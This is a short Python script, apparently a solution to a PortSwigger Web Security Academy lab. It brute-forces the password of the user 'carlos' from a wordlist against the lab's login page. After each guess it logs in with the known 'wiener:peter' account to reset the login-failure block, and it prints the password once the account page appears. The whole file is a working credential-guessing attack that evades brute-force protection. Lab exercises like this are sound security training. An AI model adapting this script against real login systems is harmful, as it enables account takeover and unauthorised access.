#!/usr/bin/env python
import requests

BASEURL = "https://ac881f4f1f9670bc808325f800140063.web-security-academy.net/"
cred = {
    "username":"wiener",
    "password":"peter"
}

data = {
    "username":"carlos"
}

f = open("../auth-lab-passwords/passwd.txt", "r")
ok = 0
for line in f.readlines():
    s = line.rstrip("\n")
    data["password"] = s
    r = requests.post(BASEURL + "login", data)
    if r.text.find("my-account?id=carlos") != -1:
        print s
    if (ok == 1):
        r = requests.post(BASEURL + "login", cred)
        #print r.text
        ok = -1
    ok += 1
